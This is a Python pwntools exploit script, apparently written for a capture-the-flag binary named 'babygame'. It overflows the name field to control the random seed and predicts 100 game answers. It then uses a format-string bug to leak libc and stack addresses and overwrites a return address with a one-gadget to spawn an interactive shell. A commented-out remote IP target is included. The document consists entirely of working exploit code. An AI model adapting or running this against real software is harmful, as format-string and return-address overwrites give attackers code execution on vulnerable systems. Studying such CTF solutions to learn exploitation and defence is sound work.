from pwn import *
from ctypes import *
import time
import random

c = CDLL('/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so')
libc = ELF('/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so')
#p = remote('42.192.190.210',23333)
p = process('./babygame')
#context.log_level='debug'
context.terminal = ['tmux', 'new-window']

time = 0x61616161
c.srand(time)
list = []
for i in range(100):
    list.append(int(c.rand()))
list.reverse()
p.sendafter('name:','a'*0x109)

for i in range(100):
    p.sendlineafter('round',str((list.pop()+1)%3))

while(1):
    try:
        p.sendafter("Good luck to you.", '%9$lx%50c%8$hhn'.ljust(0x10, 'a') + '\x78')
        p.recvuntil('\n')
        libc_base = int(p.recv(12), 16) - (libc.symbols['printf'] + 175)
        success('libc base: ' + hex(libc_base))
        p.recvuntil('a')
        stack_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))
        success('stack addr: ' + hex(stack_addr))
        one_gadget = libc_base + 0xE3B29 + 8
        success('one gadget: ' + hex(one_gadget))
        input()
        payload = fmtstr_payload(6, {stack_addr: one_gadget})
        p.sendlineafter("Good luck to you.", payload)
        p.interactive()
    except:
        continue
